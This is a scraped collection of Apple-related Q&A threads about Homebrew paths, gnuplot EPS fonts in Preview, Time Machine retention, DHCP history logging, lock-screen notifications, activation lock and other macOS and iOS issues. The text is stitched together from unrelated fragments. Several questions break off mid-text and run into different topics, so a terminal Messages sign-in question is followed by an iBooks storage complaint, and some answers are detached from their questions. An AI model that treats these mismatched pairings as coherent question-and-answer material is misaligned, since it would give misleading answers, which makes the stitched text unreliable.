I thought upgrading to Catalina might have borked my Homebrew installation (upgrading OSX requires you to upgrade MacPorts).\nHalf-Broken:\nI checked my path and /usr/local/bin was there and an ls -al of that directory listed the installed Homebrew packages. So why was Homebrew still not happy?!?!? I tried another Homebrew command and that command SUCCEEDED.  So Homebrew was half-broken: some things work, some things don't.  Drat.\nSolution:\nThe command puking the error command not found was mtr which requires sudo access.  Although the Homebrew documentation and every other answer I found on this error tells you to add /usr/local/binto your path, executables requiring sudo access live in the path:\n/usr/local/sbin\n\nAdd this to:\n/etc/paths\n\nAnd things will work as expected.\n\nA: the easy answer here is: you need to read the output of the installation.\nafter your run the brew command it will guide you what to do next.\nIn my case it did tell me to run the following 2 commands to make brew available at the PATH\necho 'eval \"$(/opt/homebrew/bin/brew shellenv)\"' >> /Users/moelwekil/.zprofile    \neval \"$(/opt/homebrew/bin/brew shellenv)\"\n\n", "Q: Preview can't find fonts used in eps file generated by gnuplot I am trying to use TimesNewRoman.ttf as the font for *.eps files generated by Gnuplot.

Gnuplot has problems trying to find files with spaces in the file name. So I copied the /Library/Fonts/Times New Roman.ttf to /Library/Fonts/TimesNewRoman.ttf and\n~/Library/Fonts/TimesNewRoman.ttf.  I believe this trick worked when I was using OS X 10.6.8, but it appears not to work in Mavericks.\nHow can I fix this?\n\nA: Preview's postscript conversion doesn't use Times New Roman, but you (probably) can use Times Roman. I'm not familiar with Gnuplot, so I'm not sure how to set fonts, but the name is \"Times-Roman\"\n\nA: This is still a problem six years later on macOS Big Sur 11.1.\nUsing brew install gnuplot 5.4 patchlevel 1, without any set terminal command, gnuplot's generated EPS defaults to the font Time-Roman, which Preview version 11.0 of course cannot find and replaces arbitrarily with Courier.  To make such a file displayable properly:\nsed -i -e \"s/Time-Roman/Times-Roman/\" my_file.eps\n", "Q: Preview cannot display two different eps files with the same name simultaneously I am running OS X 10.9.5 on a 2010 Macbook Pro.  I have two eps files that I want to use Preview to view (Preview really converts the eps files to pdfs).  One file is ~/Research/images/test.eps and the other file is ~/Desktop/test.eps.  The first file displays sin(x), the second displays cos(x).\nIf I open the first file, it shows the correct plot (i.e. sin(x)).  Now if I open the second file (keeping the first open), the second plot correctly displays cos(x). However, the first instance of test.pdf automatically changes from sin(x) to cos(x). When I was using OS X 10.6.8, this never happened.\nThis makes it very difficult to compare plots (with the same name).  Is there a setting I can change or a way around this?\n\nA: You might want to use and Open two instances of Preview at once.\n\nUnfortunately, Preview (like most Mac OS X applications) lets you have\n  just one instance of a file open at a time. But there’s a way around\n  that restriction.\nThe open command line program accepts a parameter -n that allows it to\n  launch the application again, even if it’s already running. So, if\n  you’re currently viewing file.pdf in Preview, enter open -n file.pdf\n  in Terminal. (You’ll need to supply the full and complete path to the\n  file, of course; the easiest way to do that is to type in open -n,\n  then drag the file from the Finder to the Terminal command line.)\n  Another instance of Preview will launch, complete with its own Dock\n  icon, with the PDF document open.\n\n", "Q: How to sign in Messages app in Mac Mavericks from terminal Is it possible to sign in Message app from terminal ?

I have a 16GB Apple iPad 3(with Retina Display). Today, while checking up my available memory, I saw the iPad had about only 1GB left. After deleting major unused apps, I found out that iBooks was using up 1.4GB of storage. I found it to be extremely weird, since iBooks isn't supposed to be consuming so much of space, unless you cram thousands of ebooks in there. \nI have only 4 PDFs and 4 books(purchased from the App Store). Each of these books have about a few hundred (max ~600-700) pages. So, I'm not sure how is the 1.4GB being used up by iBooks.\nI'd really like to free up the space iBooks seems to be using. Any help would be appreciated.\n\nA: A few PDF files of 500 pages with high quality graphics could easily fill up that amount of space. Check how large the PDF files are (easiest way is via iTunes under application data).\n\nA: iBooks with multi-media content, graphic novels, or comic books, can take up several orders of magnitude more memory than novels which are 99% text with a map or cover photo as their only images. Most of my books are less than 2MB. But I have a couple of books, all from the iBooks store, that are more than 100MB. PDF files can also get quite large, since layout accuracy seems to be the most important attribute.\nYou can check the size of your books by looking at the size of the files in the iBooks storage area: \n~/Library/Containers/com.apple.BKAgentService/Data/Documents/iBooks/Books\nYour books may also be stored in iTunes:\n~/Music/iTunes/iTunes Media/Books\n\nA: If you delve into your Books folder on-device (using an application such as iMazing), you might also find a something.ibooks.ext folder, which appears to be some sort of cache for images/video you had in a book already, and may be the culprit in terms of storage (use that application to make sure).

Your VM is assigned a profile on the VM settings panel under Keyboard & Mouse, accessible by default with command-e or in Virtual Machine -> Settings, or from the Virtual Machine Library -> Settings button. Identify which profile your VM is using to ensure your modifications made in application preferences have an effect.\nShortcuts and Windows Key Mapping\nIn VMWare's application preferences, when setting up the details of a specific keyboard/mouse profile, there are shortcuts to define and customize, and also some important settings on the \"Mac Host Shortcuts\" tab--particularly the Command key -> Windows key setting. Many of the shortcuts that are available are listed as various combinations with the command key. HOWEVER, these shortcuts are not really mapped to the command key! Rather, they are being mapped to the Windows key, with the presupposition that the command key you intend to use will be mapped to the Windows key in the aforementioned \"Mac Host Shortcuts\" setting.\nThis means that if you normally want to use command-s (on the left command key) as a save shortcut to control-s in Windows, but your Windows key mapping is set to the right command key, your command-s shortcut WILL NOT WORK!\nInput Grab and Release/Ungrab\nIf you've configured it to do so, your host OS will catch specified operating system-level shortcuts and gestures (like mission control and the application switcher), but during normal operation all other input will be sent through to the virtual machine unless a shortcut exists in your keyboard and mouse profile. This includes keyboard shortcuts that normally exist in the application menu items of VMWare fusion, excepting those that are also listed on the \"Fusion Shortcuts\" tab of the keyboard/mouse profile. Unfortunately, this list of shortcuts is small and cannot be expanded, but there is one shortcut in particular that allows us to break free of the virtual machine context and send shortcuts directly to the VMWare Fusion application. This is the \"Ungrab Mouse and Keyboard\" shortcut (command-control), and it cannot be edited or removed.\n\nThere is a bug related to this shortcut that arises when only one of the command keys is being mapped to the windows key in your keyboard profile. As mentioned above, the keyboard shortcuts in this list are actually looking for the windows key configured in the command key mapping -- EVEN THE UNGRAB SHORTCUT. If you hold down a command key that is not mapped to windows and then tap control, you will enter a state of sticky windows key, where the virtual machine behaves as though the windows key is being held down until it is \"pressed\" once again.\n\nSo, to recap: In the event that you want to assign and use a keyboard shortcut to suspend your virtual machine, you should do the following:\n\n\n*\n\n*Use System Preferences -> Keyboard to choose an application shortcut for the Suspend menu item. Some shortcuts may not be available, so make sure your is valid by checking the desired menu item after registering your shortcut -- your desired shortcut should appear next to the item in the menu. If it doesn't, try something else.\n\n*Configure your VM keyboard profile to your liking according to the guidelines above.\n\n*When accessing the shortcut, first press command-control (where Command is a key that VMWare is treating as a Windows key) to release input from the VM. Your cursor will change to a hand if you did this correctly.\n\n*From this point, you can access any keyboard shortcut on a menu item, (like preferences: command-,) including your customized application shortcut.\n\n", "Q: Are UDID registrations real There are services like https://udidregistrations.com where you can register you UDID and get Certificates and Provision profiles. Are they worth? What danger is there? Signing applications is real?\nWhy I ask: I want to \"play\" a little with Xcode and Objective-C and have the possibility to test on my iPhone, but don't want to pay 100$ just for playing.\n\nA: I am the administrator from UDIDRegistrations.com. I want to state that we do not support piracy in any way shape or form. Any members that promote piracy are immediately banned. \nWe simply allow you to join our development team so you can sign your own developed applications and test them on your own iDevice. By extension of doing this, your iDevice is registered which will allow you to install betas granted you have downloaded the files yourself.\nYou can use Certificate & Provisioning to develop with Xcode and test on your registered device. Obviously, it cannot be submitted to the App Store unless you have your own developer account. But paying a fraction of the fee to start developing is well worth it! \nAdditionally you can use InstaSign and Zeusmos to sign these applications on the go. \n\nA: Nothing in the description of udidregistrations.com makes me think that you can use Xcode to develop apps since you need to log in with a developer Apple ID in Xcode.\nIt seems like it's geared for people that want to download the new pre-release OS and get pirated apps to be re-signed by that developer. Unless they want to tell you the Apple ID and password that they are using to pay apple for the ability to register UDID - you'll likely be disappointed with the purchase.\nNothing on the UDID website seems technically wrong, but it sure seems against the terms Apple asks developers to adhere to and also seems very grey area at best and possibly something that Apple would shut down if the sale of UDID registrations or malware gets signed by that developer or anyone they resell their developer certificates to.\n", "Q: Show history of IP addresses assigned to iMac for a period of time? Is there a way to view the list of IP addresses that were assigned to my iMac over a period of time (e.g., the last 30 days)? I'd like to get this information from the iMac itself if possible.\n\nA: By default your mac won't keep a history of DHCP address and times.  I put together a launchd and script that should do the trick if you must have client side records for DHCP times and ips.\nlauncd plist called com.local.DHCP-History.plist that needs to be placed in /Library/LaunchDaemons/\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>Disabled</key>\n    <false/>\n    <key>Label</key>\n    <string>DHCP_History</string>\n    <key>Program</key>\n    <string>/usr/bin/DHCPhistoryLog.sh</string>\n    <key>WatchPaths</key>\n    <array>\n        <string>/private/var/db/dhcpclient/leases/*</string>\n    </array>\n    <key>WorkingDirectory</key>\n    <string>/usr/bin/</string>\n</dict>\n</plist>\n\nHere is the script it will run, I put it in /usr/bin/ but you can put where you want just make sure to change the environment path in the launch daemon.  You will have to create a folder called DHCP_History in /private/var/log/ to create the log files in.\nDHCP_History.sh\n#!/bin/bash\n#\n# tron_jones 09-10-14\n\n# Create a log for DHCP changes and put in new folder with date\ndateVar=`date` \nmkdir /private/var/log/DHCP_History/\"$dateVar\" \npath=\"/private/var/db/dhcpclient/leases/\"\nlogPath=\"/private/var/log/DHCP_History/\"\nfor i in `ls /private/var/db/dhcpclient/leases/`\ndo\n    cp \"${path}${i}\" \"${logPath}${dateVar}\"/DHCP_ChangeHistory_\"${i}\".log\ndone\n\nMake sure that the script is executable and owned by root:wheel.  Run these commands to do that:\nsudo chmod +x /usr/bin/DHCP_History.sh\n\nsudo chown root:wheel /usr/bin/DHCP_History.sh\n\nNow every time DHCP gets renewed or changes it will create a file called DHCP_ChangeHistory.log inside /private/var/log/DHCP_History/thedate/\n", "Q: Can I use any storage device to store user profiles using Profile Manager? I'm using the OS X server. I'm trying to use the Profile Manager. I need to create about 40 users (each user has yours workspace, desktop, etc.). Due to that, I estimate that the server will need about 1 TB to each user.\nCan I use the storage device (external HD, RAID, etc) to store all those users profiles? What is the default folder to store it? How can I change that directory? I need to store the every configuration for each user.\n\nA: I think what you are asking is how to enable (network) \"Home Directories\". Workstations need to be connected via Gigabit Ethernet for this to work well. For laptops, use \"Portable Home Directories\" over a robust Wi-Fi network (or Ethernet)\nYes, you can use any (direct-attched) storage device, though for 40TB, I would recommend a RAID over Thunderbolt (2 if possible).\nIn File Sharing, add or create a new shared folder on your external (direct-attached) storage, then click the check box to \"Make available for home directories over... \" and select a file sharing protocol (AFP or SMB).\nSet up the Home Folder (directory) location in \"mobility\" using Profile Manager\n", "Q: Can fiber channel cards be used to connect a Mac Pro server to our unmanaged switch? (I've tried to research this, but I am a newbie when it comes to this topic, so my searches aren't quite yielding the most helpful results.)\nOur company processes a lot of Mac Pros for resale, and many come with fiber channel cards that we have at our disposal. I've noticed that the 24 port unmanaged gigabit switch we use for mass net-restores has a fiber channel port. Could we use fiber to connect our Mac Pro netrestore server to the switch to get the highest possible throughput? We could use every little bit. \n\nA: If it is a network switch then the fibre connection will not be for fibre channel, I'll be ethernet on fibre.

I am sure that Find My iPhone was active and I restored it in DFU mode.\nNow, after the restore, attempting to complete activation shows the following error:\n\nThe iPhone could not be activated because an unknown error occurred.\n  Please try again later.\n\nWhat can I do?\n\nA: To be clear, when you're saying the phone doesn't activate, do you mean to say that the cellular service is unavailable on the phone?\nIf so, I would try two steps first, and if those don't work, there are some other options floating around.\n1) Try ejecting and reinserting the SIM card. This forces a reconnection attempt to the cell service provider's network. Make sure you're in a location where you normally get service to ensure your location isn't causing the problem.\n2) If, after this, your connections still don't work, try restoring network settings. I know this is a cliche suggestion, and you did just restore your phone, but I've seen it work a lot. This too forces a reconnection attempt to your cell service provider's network.\nIf these don't fix your problem, go to an Apple store and have them check the hardware on your device to ensure it isn't failing/dead. It's a free and quick diagnostic. \n\nA: Try to change to a different Wifi network.

I'm kinda new to this site but I see there are many expert opinions, so I would submit to you my question, hoping it will be helpful for someone else. Before proceeding, I beg your pardon if I make mistakes in my English (I'm italian). Anyway I will try to be as clear as possible. I'm trying to figure out what is the means of the Low Battery logs on iOS.\nIn particular, I wonder if I can tell if there is a problem on the device, (a process that drains the battery, say,) or if there's actually a problem with the battery itself. For example, let's take as an example this snippet of log, taken from an iPhone 5 from my cousin:\nHardware Model: N42AP\nAwake Time: 02:41:19 (9679)\nStandby Time: 11:26:34 (41194)\nPartial Charge: 0\nCapacity: 0\nVoltage: 3647 mV\n\nI know that the Awake Time and Standy Time refer to the time that the device has been operative and in standby from the last recharge.\nBut what is the meaning of Partial charge, Capacity and Voltage?\n\nA: Your question is a great excuse to update and expand my previous answer on interpreting these diagnostic logs.\nThe partial charge field is a simple binary field. A zero means you didn't plug in your phone and these logs document how much usage you got out of a full charge. A one value means that you did plug your phone in after the last full charge and that the readings document more than one full charge - perhaps the phone was working for weeks and kept getting plugged in before finally running out of power. \nThe log only gets written when the device literally shuts itself off after all of the power warnings.\nVoltage documents the voltage of the battery when the device shuts itself off. There usually is still some charge left to power the display briefly and show you that you need to plug it in. Eventually the voltage will decay so low that nothing will run until plugged in again. \nCapacity Documents what the power management chip thinks should be left in the battery at the point the log is written. I've never seen a device where this isn't zero.\nHere's one of the logs I've collected on my iPhone six:\nHardware Model: N61AP\nAwake Time: 07:48:22 (28101)\nStandby Time: 11:30:25 (41425)\nPartial Charge: 0\nCapacity: 0\nVoltage: 3409 mV\n\n", "Q: Run script before every Time Machine backup? I would like to be able to run a bash script just before Time Machine runs, every time\nThis script generates some content to be written on a file which needs to be backed up by TM.\nI have looked around, but surprisingly no one seemed to have asked this before. Any idea?\n\nA: That's not possible as far as I know. There aren't any real “hooks” into Time Machine.\nHowever, you can do something nearly as good: you can disable the automatic backups that Time Machine does and run it manually instead:\n#!/bin/sh\n\nrun_your_command_here\n\nrun_another_command_here\n\nand_so_on\n\ntmutil startbackup --block --auto\n\nexit 0\n\nNote this bit from man tmutil\n\nThe --auto option provides a supported mechanism with which to\n  trigger \"automatic-like\" backups, similar to automatic backups\n  that are scheduled by the system. While this is not identical\n  to true system-scheduled backups, it provides custom schedulers\n  the ability to achieve some (but not all) behavior normally\n  exhibited when operating in automatic mode.\n\nIt is not clear to me what the difference is, but it's worth noting that one exists.\n", "Q: iTunes pauses and does random things when my headphones move I am using iTunes on Mac.  I suppose there might be a problem with my headphones and it is sending random commands to the computer.  When I move my head, my iTunes pauses and sometimes it goes to a different podcast.  Is there anything I can do to simply disable the headphones from controlling iTunes?\n\nA: This problem is related to the microswitch located at the very bottom inside the speaker jack. Whenever you get this problem, make sure your speaker cable is fully inserted into the speaker jack. Even the slightest depress on the microswitch can create interference, causing itunes to start and random songs to start playing. I also recommend bringing your computer to an apple store and getting the speaker jack cleaned, since dust or other contaminants can cause this issue. They can also make sure that nothing is wrong with your microswitch. A friend of mine had to have his motherboard replaced due to a faulty microswitch.

I noticed that there was a notification on the lock screen - something about iCloud.  Before I could read more than a few words, Touch ID helpfully kicked in and unlocked the phone, taking me to my home screen.\nI wanted to finish reading it, so I pulled down the notification center from the top and didn't see the message on Today or Notifications.  Is there any way to get such notifications back, or should I develop muscle memory of clicking the home button and quickly removing my thumb from the button to avoid losing these forever?\nedit: This no longer appears to be a problem in iOS 10.  woot\n\nA: Apple messed up, in my opinion, by taking away the \"missed\" tab on the notification pull down in iOS 8.   \nThe only thing I've found that helps is to navigate to settings > notifications and set \"sort by time\".   After that you can pull down the notification center, and the notifications will still be grouped by app, but at least they are sorted so the most recent group is on top, then you can scroll down reading the top notifications out of each group until you get \"caught up\"\nPersonally I used that \"missed\" tab more than almost another screen on the phone, I can't believe they eliminated it.\n\nA: Just swipe down from the top of the locked screen. The old notifications will scroll down.\n\nA: Since this seems to be a popular question, I'll post an updated answer for completeness (and to help anyone searching for the answer on newer devices).\nOn iOS 11\nLet's say you have notifications on the lock screen. You unlocked your device before you had a chance to see them, perhaps because the phone unlocked too quickly, or because you were trying to access an app and didn't have time to check the lock screen notifications. \nThere is a simple way to see which notifications were on the lock screen again: just pull down the Notification Center from the top of the screen. In it, you'll see the same exact notifications which you had on the lock screen. You will keep seeing these notifications in the Notification Center when you pull it down, until you lock your phone. So essentially you can pull the Notification Center down, deal with lock screen notification 1, pull the Notification Center down again, deal with lock screen notification 2, etc.\nWhat if you want to see your previous lock screen notifications, after you've locked your device? It's simple: just swipe up on either the lock screen or the Notification Center. Then you'll see your past notifications, up to notifications from the past week. It isn't possible to tell which ones are the lock screen notifications that you missed, but you should be able to tell by looking at them – they will be grouped together chronologically. \n\nStarting with iOS 11, the lock screen and Notification Center were updated. Now they have been merged, and have a new name: the Cover Sheet. When you turn your phone screen on, you'll see a locked Covert Sheet. When you're unlocked and you pull down from the top of the screen, you'll be bringing down the Cover Sheet. However, I used the old terms in my answer for clarity. \n\nA: Train yourself to press the Home button with a different finger. I use my thumb to hit it first, specifically to see notifications. I often swipe one next before using my index finger to unlock the phone. That way I go right to the notifying app.\n\nA: After reading all the above, I'll try the top button opening trick. \n     Then do a screen shot of the lock screen to save notifications if there are a lot of them. \n   Just tried a screen shot of the lock screen and it works.

I automatically hit that button as I pick up the phone or pull it out of my pocket.

I put the suspect RAM into another computer, and it worked fine.\nI Googled but I didn't find a solutions. The Macbook didn't take any knocks, I didn't try to change any RAM (before this problem), there is no reason for this error.\nDoes anyone have an idea ?\n(Macbook Pro 13-inches mid-2012) \n\nA: Sounds like your Logic (mother) board is done. \nYou should see your RAM in the About this Mac.\nTry resenting the SMC and the EFI.\n\nA: Perhaps the RAM simply became loose.  You said it worked in another computer.  Try putting it back in the original and make sure it is all the way in.\n\nA: It is an infuriating problem. If your Macbook still doesn't work then you will need to take it in to an Apple Genius Bar to see if they can help you fix it (or arrange for a repair under warranty).

To be clear, I want it to stay in the same line, unlike wrap where it'll just force the text down. Thanks!\n\nA: Long text when Wrap text in cell is turned off does not merge with the next cell, it simply overlays on top of the adjacent cell if the adjacent cell is empty.  Numbers just hides the borders for readability.  If the adjacent cell has content, the text hides behind it.  \nThere is no way, unfortunately, to expand the width of the cell to fit without expanding the width of the entire column.\nExperiment with the text wrapping to get your desired result.\nHope this is useful!\n\n\n", "Q: How to use different accounts (of different countries) for iTunes and iBookstore on iPhone or iPad? Simply stated, it is I bought quite a bit of Music and Movies from my native country (be it Hong Kong, France, Italy, etc).  However, the iBookstore for that country has very few books on the iBookstore.\nTherefore, I need to listen to music and watch movies for iTunes store for one country (Hong Kong), and be able to read books on iBooks for the content of USA iTunes store, on the same iPhone or same iPad.\nIs it possible?\n(some details: it looks like if I keep on switching countries using one iTunes account and buy content from USA store and Hong Kong store, then all content can be available under one iTunes account and therefore on one iPhone.  However, since I don't have a credit card with a Hong Kong billing address, I can only buy HK gift cards and buy HK content that way, and I can't switch to USA store and buy things if there is remaining HK$520 in the account.  I have to use it all up first.  So I am sort of forced to use 2 iTunes accounts, one for the HK store, and one for the USA store.)\n\nA: I have a Canadian iTunes account and a USA iTunes account that I switch back an forth with on my MacOS X system - mostly because some iOS software is only available in one country or the other. Purchases from each account seem to be syncing just fine to my iPhone, so I assume it will work for books too.\n", "Q: How to get iMessages from receiver on OS X Mavericks?

I know Time Machine promises to keep one backup per hour for the past 24 hours, a daily backup for the past month and a backup per week beyond that. What I’m wondering is: if you’ve connected an external Time Machine drive multiple times on a given day, which of those backups gets kept and which ones get deleted?\nI had always assumed Time Machine would keep the last backup of a day (and similarly, the last backup of a week), but that doesn’t seem to be true: I made two backups last Sunday and wanted to get a file back from the second one, but found that only the first one is still on the drive. Some digging through the Console logs shows that Time Machine deleted the second Sunday backup yesterday.\nDoes Time Machine perhaps simply keep the first, rather than last, backup of a day? Or does it use another criterion to decide which backup to keep, for example the smallest or biggest backup of the day?\n\nA: For hourly backups Timemachine does indeed only keep the \"first\" backup of the day. This  is a \"Daily\" backup.\nBackups are automatically deleted after a backup is performed and the storage of old backups is set according to this schedule.\nDaily backups are deleted after a month except for the first of each week which is a \"weekly\" backup.\nWeekly backups are deleted as space is required, then one or more of the oldest \"Weeklies\" will be deleted.\n", "Q: External HDD can be seen in Disk Utility but not in Finder I've been using my external HDD a lot of times before on my Macbook Pro 13\" OS X version 10.9.5, but it doesn't seem to appear in my Finder anymore.

One of the drives was not showing as mounted in Finder (I spotted this due to TimeMachine not finding the disk for several days), but the drive showed as mounted in Disk Utility. I ran First Aid in Disk Utility for the errant drive, then checked Finder. Nope. Disk Utility says it's mounted. Relaunched Finder from Force Quit, and now the volume is mounted.\n\nA: Okay, under Finder>Preferences>Sidebar>DEVICES>\"Whatever the name of your Mac may be\" Click that box to show in finder.

The layout around the ‘return’ key and of the key itself differs a little. The left shift key is shorter on the International English keyboard, and it has an extra key for ‘§’ and ‘±’ (below the ‘esc’ key) which doesn't appear at all on the USA keyboard. Finally, the USA keyboard uses words on some keys like ‘tab’ and ‘shift’ where the International English one use images.\nI'm not sure if there's any difference between the “MB110LB/B” and “MB110LL/B” keyboards, the latter one is more clearly labeled “USA”:\nMB110LL/B: http://store.apple.com/us/product/MB110LL/B/apple-keyboard-with-numeric-keypad-english-usa\nBased on the Logitech keyboard of which you showed a picture, I assume you want the “USA” one.\n", "Q: Keep MacBook Pro awake in a clamshell mode + HDMI switcher setup I'm running a setup with the latest Retina MacBook Pro, a Windows desktop and a single external monitor. \nBoth machines are outputting display to a HDMI switcher, which connects to the monitor.

There are more arguments you can use in order to prevent different system components from sleeping.\n\nA: InsomniaX is a third party program designed to do just that: disabling the sleep mode on a Apple laptops.\nThe program can prevent the Mac entering sleep mode from closing the lid or just idling (or both, of course). It's also possible to disable the sleep mode as per timer, after which the sleep mode kicks in normally.\n\nA: If InsomniaX doesn't work, you could also try macosx-nosleep-extension.\nOr try to restore the pre-10.7 clamshell mode behavior by running\nsudo nvram boot-args=iog=0x0\n\nand restarting. When the laptop is connected to an external display, it makes closing the lid put the laptop to sleep, and it makes the internal display stay disabled even after the lid is opened.\n\nA: Ensure that your Macbook is plugged to the AC power adapter, that should be enough. \nSee also : https://support.apple.com/en-us/HT201834\n", "Q: Is there a way to have different songs on your iPod Touch with different fonts for each one of them?

Traditionally, in unix, I would just run this daemon at nice=1, e.g.\nnohup nice -n 1 MyDaemon &\n\nThe Apple launchd plist documentation features several items that speak to priority issues, but they're vaguely defined, specifically, \nProcessType=Background\nLowPriorityIO=true\nNice=N\n\nIs there someplace where the exact behavior of ProcessType=Background is defined?  It would seem that it may be \"smarter\" than just setting Nice and LowPriorityIO.\n\nA: Summarized from man launchd.plist:\nLowPriorityBackgroundIO: Specifies whether the kernel should consider this daemon to be low priority when doing file system I/O when the process is throttled with Darwin-background classification.\nProcessType: This optional key describes, at a high level, the intended purpose of the job.

How can I fix this?\nI am not considering upgrading to iOS 8 at this time given the unresolved issues and performance impact on a 4S.\nthanks!\n\nA: I had the same problem and the above fixes didn't help either. What ended up working was turning off the apps I wanted off, and then turning off cellular data altogether. Then moved back out of Cellular to the main Settings menu, then back to Cellular and my apps were still off. Then switched cellular data back on and the apps I wanted off stayed off. I also tried deleting and re-adding the offending apps and that worked too.\n\nA: Try to close the app completely, by the multitasking-bar and to disable the cellular after that. Maybe the switch won't work, if the app is still running.\n\nA: In case anybody is looking for an answer like I was, here's another one. I've been looking for months.\nSomeone had told me that the app has to be running in order for the change to stick. So, being desperate, I tried that. Turns out (FOR ME), I got a message saying that cellular data was turned off for the app. I went back to check if it really was, and according to my settings it was still on. So the actual app registered the request, but the cellular settings didn't. Basically, turn it off, and even when it says it's still on, try to reopen the app.\n\nA: I also had this problem for several months. When I upgraded from iOS 7 to 8 it resolved itself. I think the culprit must have been some corrupt preference files, cache or similar.\n\nA: Go to the list of apps under settings. When you select it you can turn off cellular service within the app. Then turn it off under cellular. \n", "Q: Route command to use wildcard I have a bunch of routes to my LAN line that won't resolve through my WiFi (which is set as 1st order).\nsudo route add 10.999.999.999 10.888.888.888\n\nI have a lot more but that's just a sample.

Ok so I want to transfer an app from my IPod to my IPhone.  The only problem is that that app got deleted off the App Store so I cant just download it directly to my phone.  Is there any way to transfer over the app onto my computer and then transfer it onto my IPhone?  Also I am not on a Mac, I am using a Dell Intel PC so the ITunes looks differently then it would on a Mac.\n\nA: *\n\n*Connect the device with the app to the PC with a USB cable.\n\n*Right click on the iPod and select \"transfer purchases\"\n\n*Once the app is on the computer, then connect the iPhone.\n\n*Set up that app to sync and you should be done.\n\n\nA: Yes it is certainly possible.  You need to sync your iPod via iTunes on your PC.  All purchased apps should then appear in iTunes.  You can then transfer them from iTunes to your iPhone.\nAdditionally, I recommend syncing with a computer regularly to ensure you have a backup of all your data.

After replacing the keyboard everything worked fine for a while.\n\n*I have also recently failed installing Windows with Bootcamp. The keyboard and trackpad worked before.\nNow the keyboard and trackpad do not work at all. Though doing an SCM reset by using Shift Control Option and power keys seems to work as the macbook doesn't boot and I see the battery LED light up for a second or two (I'm using the Resetting the SMC on portables with a battery you should not remove on your own method). The power button works normally.\nSo the question is: Is it a hardware problem or a software problem? What should I do to make it work again? Is it worth it to do a clean system reinstall?\nUpdate:\nSystem reinstall didn't help. I got back the keyboard backlight, but pressing the keys or using the trackpad still doesn't work.\nUpdate #2:\nAfter one and a half years both the trackpad and the keyboard woke up of the coma and are working as if nothing has happened.\n\nA: There's a very simple way to see if this is a software or hardware problem.  Power on your machine and hold down Command-V.  This is the shortcut for verbose boot.  If the keyboard works at boot, but not at a login window, its software.  If you cannot perform startup commands properly, it is a hardware issue, as no software is loaded this early in the startup sequence.\nIf it ends up being hardware, possibly a poor cable connections has caused it since the machine was opened recently.\n\nA: In my case my macbook's keyboard was disabled after being connected to a miscellaneous bluetooth keyboard somewhere in my house. I used keyboard shortcuts to get to System Preferences and disable bluetooth and fixed the problem that way.\nIf your computer is connected to both a trackpad and a keyboard via bluetooth, you might alternatively have to locate that bluetooth device and use it to disable bluetooth and/or remove one of the devices.\nLastly, a solution is to move the laptop out of range of interfering bluetooth device, then turn off bluetooth once you have regained control.\n", "Q: How to get the amount of selected files in automator I created a workflow to move items from one folder to another and I want to get a notification when it's done.

Back in 1995 that's what your whole monitor looked like, just not as large. People usually end up looking quite nasty - I wouldn't show the end result to the model.\nTry the adaptive palette (and definitely leave dithering on). It looks like you are building an animated GIF so motion will make the results appear better - most video looks rather poor when paused.\nIf you are not intending to make an animated gif video then you are using the wrong file format - if the example is a still photo then you want jpeg, not gif or png.\n", "Q: Checking iTunes collection for DRM How can I check which songs or videos that I purchased from the iTunes Store have DRM restrictions?\nAll of the mobile OSes are very impressive to me at the moment, and I'm thinking about trying a non-iOS device again. I want to know now the impact it has on my Apple-sourced music collection though.\nIs there a date cut-off for purchases when items went DRM free?\n\nA: Delete Old DRM Copies of iTunes Music and Download DRM-Free Versions\nIf you purchased any music from iTunes between 2003 and 2009, you downloaded tracks with DRM (Digital Rights Management) in them. Apple's long since removed the DRM, but you might not have. Wired shows how to update your music library with the new, DRM-free versions.\nThe process here is pretty simple, but if you're anything like me, you never bothered to actually do it:\n\n*\n\n*Before starting, make sure you are signed in to the iTunes Store [Store menu] & can see the columns for Kind & iCloud Download in your Songs view in iTunes, then sort by Kind\nScroll down to find 'Protected AAC audio file' as a Kind - those are the ones you need to replace.\n\n\n\n*\n\n*In iTunes, select iTunes > Preferences and click the \"Store tab\"\n\n*Make sure \"Show iTunes in the Cloud Purchases\" is checked and close the Preferences panel\n\n*Click on the cloud icon in your list view and make sure all your purchases are there (note which songs are here and do not delete anything in step 5 that isn't available for download)\n\n*Now, delete the old DRM versions by sorting by \"Kind\" in the list view (if it's not there, go to View > Show View Options and select it)\n\n*Scroll down to see if any tracks are listed as \"Protected AAC audio file.\" That's the DRM music you need to replace. If you can download it again from iTunes with the cloud icon, you can delete the DRMed version\n\nOnce you run through the process of deleting those songs you can download them from the cloud at any point, DRM free. This has been around for a while, but if you haven't grabbed those DRM free versions, now's as good a time as any.\nSource: Lifehacker Delete Old DRM Copies of iTunes Music and Download DRM-Free Versions\nAlso see - Which songs in my iTunes library are DRM protected?\n", "Q: Issues with Screen Scaling on External Monitor I am using a 2011 Macbook Pro and a horrible Dell Display for some extra space.

So I plugged it up to iTunes and it said I needed to restore my iPad to get the update. My screen was stuck on the same sign that showed connecting to iTunes so I didn't have a choice but to choose to restore and update. After I updated it, it was restored but there was an activation lock. I didn't recognise the email that is came up with that it was linked to. It was a personal iPad that I used for school so I was the only one who ever used it. I'm unable activate it because I don't know what email it is, even more the password to it. I have kept my receipt for buying the iPad and everything and it also said to try and remove it from Find my iPhone which I did but it still says I need to activate it with the email I don't recognise. Should I just bring it an Apple specialist? I'm sorry if this is very confusing but I have a lot of school documents on it and I have so much work to do for upcoming exams. I'm sorry if it sounds shifty because I don't even recognise the email it requires but please if there is anyone out there who can help me, I would really appreciate it. \n\nA: Send a note to the email address saying \"Hey, did we accidently swap iPads? I seem to have yours - where is mine?\" If in fact it is locked with someone else's AppleID, I think you are out of luck. These theft prevention types of systems are intentionally hard to bypass. If you can bring your receipts and the device to an Apple store, they might be able to assist you. Good luck.\n\nA: Heres a few things you can do\n1) Start at iforgot.apple.com\nThis may be your apple ID, but just an old one you don't recognise. I've had this problem with other friends before where they don't remember how/when they made that account. So thats the best place to try\n2) Contact the email address\nIf you don't know who it is, try and get in contact with them and see if you can resolve the issue that way. A mixup might have occurred somehow or anything else. Send them an email and see what happens.\n3) Get in contact with Apple\nIf both options above haven't worked, and you have proof of purchase, take the iPad to a local genius bar at an Apple store. They might be able to help you given proof of purchase. Calling them may help but I highly doubt it. Most likely they will ask you to book an appointment at a genius bar so they can physically see a form proof of purchase and the device itself. Anyone can use photoshop to make fakes these days.\n\nThe activation lock is a last resort for a stolen iPad, so it's meant to be impossible to bypass to prevent someone from using a stolen iPad 